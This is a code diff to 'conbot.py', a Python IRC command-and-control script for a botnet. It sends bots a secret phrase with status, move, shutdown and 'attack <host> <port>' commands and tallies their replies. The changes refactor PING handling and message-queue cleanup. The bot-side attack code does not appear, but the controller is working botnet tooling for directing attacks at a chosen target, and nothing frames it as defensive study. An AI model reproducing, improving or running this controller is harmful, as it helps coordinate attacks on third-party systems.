@@ -14,18 +14,7 @@ except:
     print("invalid arguments: python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
     sys.exit()
 
-def ping_answer(irc):
-    global ircMessage
-    while True:
-        if len(ircMessage) < 1: continue
-        indata = ircMessage[0]
-        inmsg = indata.split()
-        if 'PING' in inmsg[0]:
-            del ircMessage[0]
-            msg = "PONG "+inmsg[1]
-            irc.send(msg.encode())
-        else:
-            pass
+
 # use to establish connection with a irc
 def connect(irc, hostname, port):
     while True:
@@ -41,6 +30,7 @@ def connect(irc, hostname, port):
         indata = irc.recv(1024)
         inmsg = indata.decode("utf-8").split("\r\n")
         state_code=inmsg[0].split()[1]
+        print (inmsg)
         # wait 5s before retrying to connect
         if state_code != "001":
             time.sleep(5)
@@ -73,6 +63,7 @@ def status():
     while time.time() < t_end:
         if len(ircMessage) < 1: continue
         indata = ircMessage[0]
+        del ircMessage[0]
         inmsg = indata.split()
         if len(inmsg) < 4:
             pass
@@ -81,7 +72,6 @@ def status():
             slave = inmsg[0].split("!")[0].replace(":","")
             sys.stdout.write(slave+"\n")
             sys.stdout.flush()
-            del ircMessage[0]
 
     sys.stdout.write(str(totalBot)+" bots\n")
     sys.stdout.flush()
@@ -100,6 +90,7 @@ def move(newhost,newport,newch):
     while time.time() < t_end:
         if len(ircMessage) < 1: continue
         indata = ircMessage[0]
+        del ircMessage[0]
         inmsg = indata.split()
         if len(inmsg) < 5:
             pass
@@ -111,7 +102,7 @@ def move(newhost,newport,newch):
                 numSuccess += 1
             else:
                 numFail += 1
-            del ircMessage[0]
+
 
     # print out report
     sys.stdout.write(str(numSuccess)+" success\n")
@@ -131,6 +122,7 @@ def shutdown():
     while time.time() < t_end:
         if len(ircMessage) < 1: continue
         indata = ircMessage[0]
+        del ircMessage[0]
         inmsg = indata.split()
         if len(inmsg) < 4:
             pass
@@ -139,7 +131,6 @@ def shutdown():
             sys.stdout.write(slave+": Shutting Down\n")
             sys.stdout.flush()
             numBot+=1
-            del ircMessage[0]
 
 
     # print out report
@@ -150,6 +141,7 @@ def shutdown():
 
 def attack(host,port):
     global irc
+    global ircMessage
     msg = "PRIVMSG #"+channel+" :"+sphrase+" attack "+host+" "+port+"\r\n"
     irc.send(msg.encode())
     numSuccess =0
@@ -159,6 +151,7 @@ def attack(host,port):
     while time.time() < t_end:
         if len(ircMessage) < 1: continue
         indata = ircMessage[0]
+        del ircMessage[0]
         inmsg = indata.split()
         if len(inmsg) < 4:
             pass
@@ -173,7 +166,6 @@ def attack(host,port):
                 numSuccess += 1
             else:
                 numFail += 1
-            del ircMessage[0]
 
     # print out report
     sys.stdout.write(str(numSuccess)+" success\n")
@@ -208,14 +200,22 @@ def commands():
         sys.stderr.write(str(err)+"\n")
     return
 
-#use to grab all irc message
+#use to grab all irc message and handle ping
 def messageGrabber(irc):
     global ircMessage
+
     while True:
         indata = irc.recv(1024)
         indataList = indata.decode("utf-8").strip().split("\r\n")
         for s in indataList:
-            ircMessage.append(s)
+            inmsg = s.split()
+            if len(inmsg) < 1:
+                pass
+            elif 'PING' in inmsg[0]:
+                msg = "PONG "+inmsg[1]
+                irc.send(msg.encode())
+            else:
+                ircMessage.append(s)
 
     return;
 
@@ -231,9 +231,7 @@ while True:
     try:
         connect(irc,hostname,port)
         joinChannel(irc,channel)
-        _thread.start_new_thread(ping_answer, (irc, ) )
         _thread.start_new_thread(messageGrabber, (irc, ) )
         commands()
     except Exception as err:
-
         sys.stderr.write(str(err) + "\n")
